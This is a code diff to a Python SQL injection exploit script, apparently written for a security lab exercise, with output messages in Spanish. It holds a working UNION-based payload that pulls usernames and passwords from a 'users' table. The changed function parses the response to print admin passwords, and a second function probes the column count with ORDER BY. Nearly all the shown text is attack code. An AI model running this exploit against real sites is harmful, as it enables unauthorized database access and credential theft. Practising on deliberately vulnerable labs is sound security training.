@@ -71,15 +71,21 @@ def exploit_sqli_users_table(url):
     common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin']
     sql_payload = "' UNION select username, password from users--"
     r = requests.get(url + sql_payload, verify=False, proxies=proxies)
-    res = r.text
+    # res = r.text
+    
+    soup = BeautifulSoup(r.text, 'html.parser')
     
     for username in common_usernames:
-        if username in res:
-            # print(f"[+] Found the password for user '{username}'.")
-            soup = BeautifulSoup(r.text, 'html.parser')
-            admin_password = soup.body.find(string=username).parent.findNext('td').contents[0]
-            print(f"[+] Encontramos la contraseña del usuario '{username}': '{admin_password}'")
-            return True
+        user_element = soup.body.find(string=username)
+        if user_element:
+            parent = user_element.parent
+            password_element = parent.findNext('td') if parent else None
+            if password_element and password_element.contents:
+                admin_password = password_element.contents[0]
+                print(f"[+] Encontramos la contraseña del usuario '{username}': '{admin_password}'")
+                return True
+        else:
+            print(f"[-] No se encontró el usuario '{username}' en la respuesta.")
     
     return False
 
@@ -108,7 +114,7 @@ def exploit_sqli(url):
 
     return False
 
-# function that detects column numbers
+# function that detects the number of columns in the database to detect errors
 def exploit_sqli_column_number(url):
     for i in range(1, 5):
         target_url = url + "'+order+by+%s--" % i
